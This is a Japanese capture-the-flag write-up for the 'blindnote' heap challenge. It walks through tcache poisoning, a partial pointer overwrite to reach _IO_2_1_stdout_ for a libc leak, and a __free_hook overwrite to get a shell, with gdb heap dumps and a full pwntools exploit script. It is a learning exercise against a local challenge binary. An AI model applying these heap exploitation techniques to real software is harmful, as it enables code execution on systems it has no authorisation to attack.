---
tags: pwn
---

# NITAC miniCTF 3rd - blindnote

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## 公式リポジトリ

<https://github.com/nitaclt/nitac-minictf-3rd>

## Writeup

checksecやBinaryの詳細は[NITAC miniCTF 3rd - babynote (+α)](/@Xornet/HJHYC1YCL)と同じなので割愛

### Outline

libcのアドレスをくれないのでまずはUnsorted Binへ繋ぐ必要がある。tcacheを埋めてからfreeしてUnsorted Binに繋ぐと該当チャンクのfd, bkメンバには`&main_arena->top`が現れるので上位はある程度libcの配置アドレスに一致する。Heap Overflowでここの下位を書き換えることが出来るのでうまい感じに`_IO_2_1_stdout_`を指すように書き換える(WSLのアドレスランダム化が結構適当なので下位2バイトまで確定しているが多分実際やる際は1/16のガチャが必要)。
続いて既にfreeされてtcacheに入っているエントリーのnextの下位バイトを同じ要領で書き換えてUnsorted Binに放り込んだチャンクを指すようにする、これでnextに`_IO_2_1_stdout_`が入っているエントリーがtcacheに入ったようにリンクリストを改竄できるので何回かのmallocで`_IO_2_1_stdout_`を書き換えることが出来る。
これでlibc leakが出来るようにポインタ群とフラグを書き換えてリークし、後はHeap Overflowでnextを書き換えてtcache poisoningし`__free_hook`にシェル起動アドレスを放り込む

### Binary

* libc: 2.27
* 保持可能ポインタ: 8
* malloc可能サイズ: 0x98のみ
* コマンド
    * create: `malloc(0x98)`して中身を書き込む
    * delete: インデックスを指定してfree、ポインタはクリアされる
* コマンド実行回数制限: 無し
* その他: [NITAC miniCTF 3rd - babynote (+α)](/@Xornet/HJHYC1YCL)から開幕のlibcアドレスプレゼントとshow機能が無くなっただけ(難易度はかなり上がったが)

### `_IO_2_1_stdout_`を出現させる

showless入門として始めた[Security Fest 2019 - Baby5 (showless leak)](/@Xornet/SkIgCyXJP)ではPIE無効で.bssセクション上の`stdout`経由で`_IO_2_1_stdout_`の書き換えが出来たのだが、今回はそうも行かない。
なんとかしてここを指すポインタが得たいのだが直接得るのは難しい、そこで既に存在する近いアドレスを悪用することを考える。
もう常識になってしまったがUnsorted Binに初めて入ったチャンクは`&main_arena->top`に相当するアドレスがfd, bkに入る。これはlibc中に存在し、実は位置も`main_arena`からそこまで遠くない(下位2バイトが異なっているだけである)。
ここでlibcの配置アドレスは下位12bitが確定している(0x1000の倍数)ことから最下位バイトに関しては事前にlibc中の位置を調べておけば確定する。
残りの1バイトも下位4bitは確定しており、上位4bitは1/16程度の確率で当てることが出来る。

ちなみに私はWSLでExploitをしているが何故かASLRとPIEのかかり具合が適当でいつもlibcは0x100000の倍数で下位20bitが確定しているので想定していたブルートフォース攻撃は必要ではなかった。

さて、今回の問題は特に量に制限が無いHeap Overflowが存在した。よってUnsorted Binに放り込んだチャンク(チャンクAとする)の真上のチャンク(チャンクBとする)を再確保する際にチャンクAのfdを書き換えることが出来る。
こうして先程の要領で下位バイトを書き換え、Unsorted Binのfdに`_IO_2_1_stdout_`を出現させることができた。

### tcacheに繋ぐ

問題はUnsorted Binのfdに繋いだところでUnsorted Binは双方向リストなのでここから取ろうとするとfd, bkのチェックが走り"あ?fdのチャンクはお前をbkに指定してねえよ"と言われてabortする。そういうわけでチェックが緩いtcacheにこのチャンクを出現させる事を狙う。
これは単純にHeap Overflowで既にtcacheに存在するエントリーのnextをUnsorted Binに入っているチャンクへ向ければ良く、tcacheに放り込まれているチャンク群の内、最下位バイトだけがUnsorted Binにあるチャンクと違うものを選択して上書きする。
下の図はUnsorted Binにチャンクが入った直後のHeap領域の様子である。

```
gdb-peda$ parseheap
addr                prev                size                 status              fd                bk                
0x7fffc74f1000      0x0                 0x250                Used                None              None
0x7fffc74f1250      0x0                 0xa0                 Freed     0x7fffc74f1300              None
0x7fffc74f12f0      0x0                 0xa0                 Freed     0x7fffc74f14e0              None
0x7fffc74f1390      0x0                 0xa0                 Freed     0x7fffc74f1260              None
0x7fffc74f1430      0x0                 0xa0                 Freed     0x7f17b23ebca0    0x7f17b23ebca0
0x7fffc74f14d0      0xa0                0xa0                 Freed     0x7fffc74f1580              None
0x7fffc74f1570      0x0                 0xa0                 Freed     0x7fffc74f1620              None
0x7fffc74f1610      0x0                 0xa0                 Freed     0x7fffc74f16c0              None
0x7fffc74f16b0      0x0                 0xa0                 Freed                0x0              None
gdb-peda$ 
```

先に断っておくとこのコマンドのアドレスとtcacheのnextに入るアドレスは0x10違っている。よって`addr`が`x`であるチャンクがtcache中にある時、リンクリスト中で前のチャンクはnextが`x+0x10`を指している(実際、fdとaddrを照合していくと分かると思う)。
また、一番上にあるチャンクは`tcache_perthread_struct`なので特に関係ない

0x7fffc74f1430にあるチャンク(インデックスで3)がUnsorted Binに存在する(fd, bkが他と明らかに違うので)。
ここで0x7fffc74f12f0にあるチャンク(インデックスで1)のnextが0x7fffc74f14e0であることに注目するとここの最下位バイトを`\x40`に書き換えることでnextがインデックス3のチャンクを指すことになる。
この書き換えを行った後の様子が次のとおりである。

```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x7fffcf16a750 (size : 0x208b0) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x7fffcf16a430 (doubly linked list corruption 0x7fffcf16a430 != 0x7f2c98dec7e3 and 0x7f2c98dec760 or 0x7fffcf16a430 is broken)
(0xa0)   tcache_entry[8](5): 0x7fffcf16a300 --> 0x7fffcf16a440 --> 0x7f2c98dec760 --> 0xfbad2887 (invaild memory)
gdb-peda$ p stdout
$2 = (struct _IO_FILE *) 0x7f2c98dec760 <_IO_2_1_stdout_>
```

確かに先程`_IO_2_1_stdout_`を指すようにしたチャンクがtcacheに入っていることがわかる。

### stdout corruption

ここまでくれば3回createすることで`_IO_2_1_stdout_`を編集出来るので、後は[Security Fest 2019 - Baby5 (showless leak)](/@Xornet/SkIgCyXJP)でやったようにメンバを良い感じに書き換えてlibc leakする。
何をしているかはこの問題と全く同じなので割愛する(先にそっち↑読んでください)

### いつもの

上記手順が理解できるならもうここの説明は不要だろうが、一応書く。
Heap Overflowがあるのでtcache中にあるエントリーのnextを`__free_hook`に書き換えて確保した際にシェル起動用のアドレスを入れるだけである。
例によって`system("/bin/sh")`を発火させた。

## Code

```python
from pwn import p64, u64, ELF, process


def select(s, sel, c=b"> "):
    s.recvuntil(c)
    s.sendline(sel)


def create(s, data=b"/bin/sh\x00"):
    select(s, b"1")
    s.recvuntil(b"Contents: ")
    s.sendline(data)


def delete(s, idx):
    select(s, b"3")
    s.recvuntil(b"Index: ")
    s.sendline(str(idx))


if __name__ == '__main__':
    """
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    """
    libc = ELF("./libc-2.27.so")
    offset = 0x7fd8e6ded8b0 - 0x7fd8e6a00000
    free_hook_libc = libc.symbols["__free_hook"]
    system_libc = libc.symbols["system"]

    padding = b"/bin/sh\x00" + b"a" * 0x90 + p64(0xa1)
    s = process("./blindnote")

    for _ in range(8):
        create(s)

    delete(s, 7)
    delete(s, 6)
    delete(s, 5)
    delete(s, 4)
    delete(s, 1)
    delete(s, 0)
    delete(s, 2)  # ready for overwrite 3
    delete(s, 3)  # unsorted bin

    # make pointer to `_IO_2_1_stdout_`
    payload = padding + b"\x60\xc7"
    create(s, payload)  # 0

    # overwrite next
    payload = padding + b"\x40"
    create(s, payload)  # 1

    create(s)  # 2
    create(s)  # 3
    payload = p64(0xfbad1880) + p64(0x0) * 3 + b"\x08"
    create(s, payload)

    libc_addr = u64(s.recv(8)) - offset
    print(hex(libc_addr))

    delete(s, 0)
    delete(s, 2)
    create(s, b"a" * 0x98 + p64(0xa1) + p64(libc_addr + free_hook_libc))  # 5
    create(s)
    create(s, p64(libc_addr + system_libc))

    delete(s, 1)

    s.interactive()

```

## Flag

ローカルで
シェル取っただけ
最上川

## 公式Writeup

* <https://ptr-yudai.hatenablog.com/entry/2020/01/26/174525#Pwn-400-blindnote>

## 感想

showless問題として作られた問題としては初めてクリア出来たので嬉しかったです。
(でもこれを当日のあの短い時間で解くのは今でも無理かもしれない)
別のshowless問題をこなしたらぼちぼちFSOPにでも挑もうと思う

が、院試出願等リアルイベントが控えているので頻度落ちるかもしれません、落とさせてください